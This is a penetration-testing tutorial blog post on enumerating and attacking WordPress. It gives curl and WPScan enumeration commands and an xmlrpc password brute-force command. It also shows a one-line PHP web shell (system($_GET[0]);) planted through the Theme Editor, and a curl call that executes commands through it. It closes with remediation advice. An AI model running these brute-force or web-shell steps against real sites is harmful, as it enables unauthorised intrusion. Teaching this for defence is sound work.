---
title: Attacking WordPress
description: Ways of enumerating and attacking WordPress Content Management System (CMS)
categories: [Hacking Web Apps, CMS]
tags: [CMS]
image:
  path: /assets/blogimages/HackingWebApps/CMS/wordpress/wordpress.png
  alt: Attacking WordPress
---


## Overview

[**WordPress**](https://wordpress.org/) is the world's most widely used open-source Content Management System (CMS), powering almost a third of all websites globally. It serves a wide range of purposes, from hosting blogs and forums to supporting e-commerce, project management, document management, and more. Known for its high customizability and SEO-friendly structure, WordPress is a popular choice among businesses. Its extensive library of themes and plugins, both free and premium, allows users to easily enhance and expand website functionality.

Built in PHP, WordPress typically operates on an Apache server with MySQL as its database backend.

## File Structure

After installation, WordPress files and directories are typically stored in /var/www/html

```
Riminux@box[/var/www/html]$ ls
├── index.php
├── license.txt
├── readme.html
├── wp-activate.php
├── wp-admin
├── wp-blog-header.php
├── wp-comments-post.php
├── wp-config.php
├── wp-config-sample.php
├── wp-content
├── wp-cron.php
├── wp-includes
├── wp-links-opml.php
├── wp-load.php
├── wp-login.php
├── wp-mail.php
├── wp-settings.php
├── wp-signup.php
├── wp-trackback.php
└── xmlrpc.php
```

The wp-config.php file is often of interest to attackers as it contains database credentials:
```
<SNIP>
/** The name of the database for WordPress */
define( 'DB_NAME', 'webapp' );

/** MySQL database username */
define( 'DB_USER', 'bob' );

/** MySQL database password */
define( 'DB_PASSWORD', 'SuP#rP4$$word!' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
<SNIP>
```

## Enumeration



### Version Enumeration

Wordpress version in source code:
```
<SNIP>
<link rel='https://api.w.org/' href='http://127.0.0.1/index.php/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://127.0.0.1/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://127.0.0.1/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.3.3" />
<SNIP>
```

Using curl to get the version:

`curl -s -X GET http://127.0.0.1 | grep '<meta name="generator"'`

`curl -s http://127.0.0.1 | grep WordPress`
<br><br>

Also links to CSS and JS files can provide version number:
```
<SNIP>
<link rel='stylesheet' id='bootstrap-css'  href='http://127.0.0.1/wp-content/themes/ben_theme/css/bootstrap.css?ver=5.3.3' type='text/css' media='all' />
<link rel='stylesheet' id='transportex-style-css'  href='http://127.0.0.1/wp-content/themes/ben_theme/style.css?ver=5.3.3' type='text/css' media='all' />
<link rel='stylesheet' id='transportex_color-css'  href='http://127.0.0.1/wp-content/themes/ben_theme/css/colors/default.css?ver=5.3.3' type='text/css' media='all' />
<link rel='stylesheet' id='smartmenus-css'  href='http://127.0.0.1/wp-content/themes/ben_theme/css/jquery.smartmenus.bootstrap.css?ver=5.3.3' type='text/css' media='all' />
<SNIP>
```
```
<SNIP>
<script type='text/javascript' src='http://127.0.0.1/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='http://127.0.0.1/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript' src='http://127.0.0.1/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.3.3'></script>
<script type='text/javascript' src='http://127.0.0.1/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.3.3'></script>
<script type='text/javascript' src='http://127.0.0.1/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.3.3'></script>
<SNIP>
```

### Plugins and Themes Enumeration

Using curl to find plugins:

`curl -s -X GET http://127.0.0.1 | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2`

```
http://127.0.0.1/wp-content/plugins/wp-google-places-review-slider/public/css/wprev-public_combine.css?ver=6.1
http://127.0.0.1/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.3.3
http://127.0.0.1/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.3.3
http://127.0.0.1/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.3.3
http://127.0.0.1/wp-content/plugins/wp-google-places-review-slider/public/js/wprev-public-com-min.js?ver=6.1
http://127.0.0.1/wp-content/plugins/mail-masta/lib/css/mm_frontend.css?ver=5.3.3
```

Using curl to find themes:

`curl -s -X GET http://127.0.0.1 | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2`
```
http://127.0.0.1/wp-content/themes/ben_theme/css/bootstrap.css?ver=5.3.3
http://127.0.0.1/wp-content/themes/ben_theme/style.css?ver=5.3.3
http://127.0.0.1/wp-content/themes/ben_theme/css/colors/default.css?ver=5.3.3
http://127.0.0.1/wp-content/themes/ben_theme/css/jquery.smartmenus.bootstrap.css?ver=5.3.3
http://127.0.0.1/wp-content/themes/ben_theme/css/owl.carousel.css?ver=5.3.3
http://127.0.0.1/wp-content/themes/ben_theme/css/owl.transitions.css?ver=5.3.3
http://127.0.0.1/wp-content/themes/ben_theme/css/font-awesome.css?ver=5.3.3
http://127.0.0.1/wp-content/themes/ben_theme/css/animate.css?ver=5.3.3
http://127.0.0.1/wp-content/themes/ben_theme/css/magnific-popup.css?ver=5.3.3
http://127.0.0.1/wp-content/themes/ben_theme/css/bootstrap-progressbar.min.css?ver=5.3.3
http://127.0.0.1/wp-content/themes/ben_theme/js/navigation.js?ver=5.3.3
http://127.0.0.1/wp-content/themes/ben_theme/js/bootstrap.min.js?ver=5.3.3
http://127.0.0.1/wp-content/themes/ben_theme/js/jquery.smartmenus.js?ver=5.3.3
http://127.0.0.1/wp-content/themes/ben_theme/js/jquery.smartmenus.bootstrap.js?ver=5.3.3
http://127.0.0.1/wp-content/themes/ben_theme/js/owl.carousel.min.js?ver=5.3.3
background: url("http://127.0.0.1/wp-content/themes/ben_theme/images/breadcrumb-back.jpg") #50b9ce;
```
### User Enumeration

Using author parameter to enumerate users:

`curl -s -I http://127.0.0.1/?author=1`
```
HTTP/1.1 301 Moved Permanently
Date: Wed, 13 May 2020 20:47:08 GMT
Server: Apache/2.4.29 (Ubuntu)
X-Redirect-By: WordPress
Location: http://127.0.0.1/index.php/author/admin/
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```
This 301 response means user exists.
<br>

Another method would be interacting with the JSON endpoint:

`curl http://127.0.0.1/wp-json/wp/v2/users | jq`
```
<SNIP>
  {
    "id": 1,
    "name": "admin",
    "url": "",
    "description": "",
    "link": "http://127.0.0.1/index.php/author/admin/",
  },
  {
    "id": 2,
    "name": "john",
    "url": "",
    "description": "",
    "link": "http://127.0.0.1/index.php/author/john/",
  },
<SNIP>
```
### Automated enumeration
Many of the enumeration tasks mentioned can be automated using a powerful tool called [**WPScan**](https://wpscan.com/):
```
wpscan --url http://<TARGET_IP>/wordpress -e at,u,ap
wpscan --url http://<TARGET_IP> -e vt,u,vp

-e Enumerate
vt Vulnerable themes
u  Users
vp Vulnerable plugins
at All themes
ap All plugins
```
Example usage:
<br>
![Desktop View](/assets/blogimages/HackingWebApps/CMS/wordpress/wpscan1.gif)
_Using WPScan tool for enumeration_

## Exploitation

### Login attacks

For login attacks I recommend using WPScan. The tool can perform two types of brute-force login attacks: xmlrpc and wp-login. The wp-login method will attempt to brute force the standard WordPress login page, while the xmlrpc method uses WordPress API to make login attempts through /xmlrpc.php. The xmlrpc method is preferred as it’s faster.


`wpscan --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url http://127.0.0.1`
<br>
Example usage:
<br>
![Desktop View](/assets/blogimages/HackingWebApps/CMS/wordpress/wpscan2.gif)
_Using WPScan tool for login brute force_



### Code Execution

After getting access to admin dashboard the attacker can navigate to Appearance->Theme Editor to edit PHP source code directly of any .php file by inserting `system($_GET[0]);`
![Desktop View](/assets/blogimages/HackingWebApps/CMS/wordpress/wordpressRCE.png)

After saving the edited contents, the attacker can execute code:

`curl http://127.0.0.1/wp-content/themes/twentynineteen/404.php?0=id`<br><br>
Example attack:
<video width="100%" preload="auto" muted controls>
    <source src="/assets/blogimages/HackingWebApps/CMS/wordpress/wprceattack.mp4" type="video/mp4">
</video>


## Statistical Data and Remediation

### Statistics
Based on [**WPScan**](https://wpscan.com/statistics/) statistics there is still a significant amount of vulnerabilities found every month. Most of them come from plugins.
![Desktop View](/assets/blogimages/HackingWebApps/CMS/wordpress/wordpressSTATS1.png)
_Growing number of vulnerabilities each year_
![Desktop View](/assets/blogimages/HackingWebApps/CMS/wordpress/wordpressSTATS2.png)
_Most common vulnerable components_

### Remediation

An effective way to prevent attacks is to keep all components updated, including plugins, themes, and the WordPress core.

There are WordPress plugins for security such as:<br>
[**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)<br>
[**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)<br>
[**WordFence Security**](https://wordpress.org/plugins/wordfence/)<br>

Other good practices are:
- Disable the standard admin user and create accounts with difficult to guess usernames
- Enforce strong passwords
- Enable and enforce two-factor authentication (2FA) for all users
- Restrict users' access based on the concept of least privilege
- Periodically audit user rights and access. Remove any unused accounts or revoke access that is no longer needed
- Install a plugin that disallows user enumeration so an attacker cannot gather valid usernames to be used in a password spraying attack
- Limit login attempts to prevent password brute-forcing attacks